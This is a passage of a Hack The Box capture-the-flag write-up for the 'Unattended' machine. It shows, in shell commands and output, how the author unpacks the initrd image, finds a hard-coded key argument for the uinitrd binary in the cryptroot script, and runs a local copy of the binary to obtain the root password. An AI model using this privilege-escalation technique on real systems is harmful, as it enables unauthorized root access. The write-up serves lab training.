find: ‘/var/lib/mysql/mysql’: Permission denied
find: ‘/var/lib/mysql/performance_schema’: Permission denied
find: ‘/var/lib/mysql/neddy’: Permission denied
find: ‘/var/lib/apt/lists/partial’: Permission denied
find: ‘/var/cache/ldconfig’: Permission denied
find: ‘/var/cache/apt/archives/partial’: Permission denied
find: ‘/boot/lost+found’: Permission denied
/boot/initrd.img-4.9.0-8-amd64
find: ‘/root’: Permission denied
find: ‘/sys/kernel/debug’: Permission denied
find: ‘/etc/ssl/private’: Permission denied
find: ‘/etc/vmware-tools/GuestProxyData/trusted’: Permission denied
find: ‘/tmp/vmware-root_861-3988621786’: Permission denied
find: ‘/tmp/vmware-root’: Permission denied
find: ‘/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-Mjh5Or’: Permission denied
find: ‘/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-xDCH4o’: Permission denied
find: ‘/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-w07Cfj’: Permission denied    
find: ‘/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-90T8ai’: Permission denied         
find: ‘/run/log/journal/b0fa41b1a9b848e8b54df33b345577c8’: Permission denied
find: ‘/run/systemd/inaccessible’: Permission denied
guly@unattended:/tmp$
</code></pre></div></div>
<p>I could only access <code class="language-plaintext highlighter-rouge">/boot/initrd.img-4.9.0-8-amd64</code>, so I created a directory in <code class="language-plaintext highlighter-rouge">/tmp</code> and copied it there.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp$ mkdir initrd
mkdir initrd
guly@unattended:/tmp$ cd initrd
cd initrd
guly@unattended:/tmp/initrd$ cp /boot/initrd.img-4.9.0-8-amd64 .
cp /boot/initrd.img-4.9.0-8-amd64 .
guly@unattended:/tmp/initrd$ ls -la
ls -la
total 19256
drwxr-xr-x  2 guly guly       60 Aug 23 13:34 .
drwxrwxrwt 14 root root      300 Aug 23 13:34 ..
-rw-r-----  1 guly guly 19715792 Aug 23 13:34 initrd.img-4.9.0-8-amd64
guly@unattended:/tmp/initrd$ 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">initrd</code> is the abbreviation for <a href="https://en.wikipedia.org/wiki/Initial_ramdisk" target="_blank" rel="noopener noreferrer">initial ramdisk</a>.<br>
Using <code class="language-plaintext highlighter-rouge">file</code> on it says that it’s a <code class="language-plaintext highlighter-rouge">gzip</code> archive :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp/initrd$ ls -la
ls -la
total 19256
drwxr-xr-x  2 guly guly       60 Aug 23 13:55 .
drwxrwxrwt 14 root root      300 Aug 23 13:55 ..
-rw-r-----  1 guly guly 19715792 Aug 23 13:54 initrd.img-4.9.0-8-amd64
guly@unattended:/tmp/initrd$ file initrd.img-4.9.0-8-amd64
file initrd.img-4.9.0-8-amd64
initrd.img-4.9.0-8-amd64: gzip compressed data, last modified: Fri Aug 23 09:26:41 2019, from Unix
</code></pre></div></div>
<p>I renamed it to <code class="language-plaintext highlighter-rouge">initrd.img-4.9.0-8-amd64.gz</code>  then I used <code class="language-plaintext highlighter-rouge">gzip</code> to extract it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp/initrd$ mv initrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64.gz
4.gznitrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64
guly@unattended:/tmp/initrd$ gzip -d initrd.img-4.9.0-8-amd64.gz
gzip -d initrd.img-4.9.0-8-amd64.gz
guly@unattended:/tmp/initrd$ ls -la
ls -la
total 60656
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 .
drwxrwxrwt 14 root root      300 Aug 23 13:56 ..
-rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64
</code></pre></div></div>
<p>The new file is a <code class="language-plaintext highlighter-rouge">cpio</code> archive :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp/initrd$ file initrd.img-4.9.0-8-amd64
file initrd.img-4.9.0-8-amd64
initrd.img-4.9.0-8-amd64: ASCII cpio archive (SVR4 with no CRC)
</code></pre></div></div>
<p>To extract it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp/initrd$ cpio -idvm &lt; initrd.img-4.9.0-8-amd64
</code></pre></div></div>
<p>After extracting it we get a lot of files :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp/initrd$ ls -la
ls -la
total 60664
drwxr-xr-x 11 guly guly      260 Aug 23 13:56 .
drwxrwxrwt 14 root root      300 Aug 23 13:57 ..
drwxr-xr-x  2 guly guly     3600 Aug 23 13:56 bin
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 boot
drwxr-xr-x  3 guly guly      120 Aug 23 13:56 conf
drwxr-xr-x  5 guly guly      240 Aug 23 13:56 etc
-rwxr-xr-x  1 guly guly     5960 Apr 23  2017 init
-rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64
drwxr-xr-x  8 guly guly      180 Aug 23 13:56 lib
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 lib64
drwxr-xr-x  2 guly guly       40 Aug 23 05:26 run
drwxr-xr-x  2 guly guly     1140 Aug 23 13:56 sbin
drwxr-xr-x  8 guly guly      220 Aug 23 13:56 scripts
guly@unattended:/tmp/initrd$ 
</code></pre></div></div>
<p>Searching for <code class="language-plaintext highlighter-rouge">guly</code> in these files reveals this interesting comment in a script called <code class="language-plaintext highlighter-rouge">cryptroot</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp/initrd$ grep -r guly *             
grep -r guly *
Binary file initrd.img-4.9.0-8-amd64 matches           
scripts/local-top/cryptroot:      # guly: we have to deal with lukfs password sync when root changes her one
</code></pre></div></div>
<p>I checked that part of the script :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>               <span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$NEWROOT</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
      <span class="c"># guly: we have to deal with lukfs password sync when root changes her one</span>
      <span class="k">if</span> <span class="o">!</span> <span class="nv">crypttarget</span><span class="o">=</span><span class="s2">"</span><span class="nv">$crypttarget</span><span class="s2">"</span> <span class="nv">cryptsource</span><span class="o">=</span><span class="s2">"</span><span class="nv">$cryptsource</span><span class="s2">"</span> <span class="se">\</span>
        /sbin/uinitrd c0m3s3f0ss34nt4n1 | <span class="nv">$cryptopen</span> <span class="p">;</span> <span class="k">then
                                </span>message <span class="s2">"cryptsetup: cryptsetup failed, bad password or options?"</span>
                                <span class="nb">sleep </span>3
                                <span class="k">continue</span>

</code></pre></div></div>
<p>This line <code class="language-plaintext highlighter-rouge">/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen</code> generates root password and pipes it to <code class="language-plaintext highlighter-rouge">$cryptopen</code>. We don’t have permission to execute <code class="language-plaintext highlighter-rouge">uinitrd</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp/initrd$ /sbin/uinitrd c0m3s3f0ss34nt4n1
/sbin/uinitrd c0m3s3f0ss34nt4n1
bash: /sbin/uinitrd: Permission denied
guly@unattended:/tmp/initrd$ 
</code></pre></div></div>
<p>But in the extracted files we have the same binary and we can execute it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp/initrd$ ls -la
ls -la
total 60664
drwxr-xr-x 11 guly guly      260 Aug 23 13:56 .
drwxrwxrwt 14 root root      340 Aug 23 14:02 ..
drwxr-xr-x  2 guly guly     3600 Aug 23 13:56 bin
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 boot
drwxr-xr-x  3 guly guly      120 Aug 23 13:56 conf
drwxr-xr-x  5 guly guly      240 Aug 23 13:56 etc
-rwxr-xr-x  1 guly guly     5960 Apr 23  2017 init
-rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64
drwxr-xr-x  8 guly guly      180 Aug 23 13:56 lib
drwxr-xr-x  2 guly guly       60 Aug 23 13:56 lib64
drwxr-xr-x  2 guly guly       40 Aug 23 05:26 run
drwxr-xr-x  2 guly guly     1140 Aug 23 13:56 sbin
drwxr-xr-x  8 guly guly      220 Aug 23 13:56 scripts
guly@unattended:/tmp/initrd$ ls -la sbin | grep uinitrd
ls -la sbin | grep uinitrd
-rwxr-x---   1 guly guly 933240 Aug 23 05:26 uinitrd
guly@unattended:/tmp/initrd$ 
</code></pre></div></div>
<p><br><img src="/images/hackthebox/unattended/20.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/helpline/">Hack The Box - Helpline</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-08-24T07:00:00+02:00">August 24, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/helpline/" class="pagination--pager" title="Hack The Box - Helpline
">Previous</a>
    
    
      <a href="/pwn/collision/" class="pagination--pager" title="pwnable.kr - collision
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
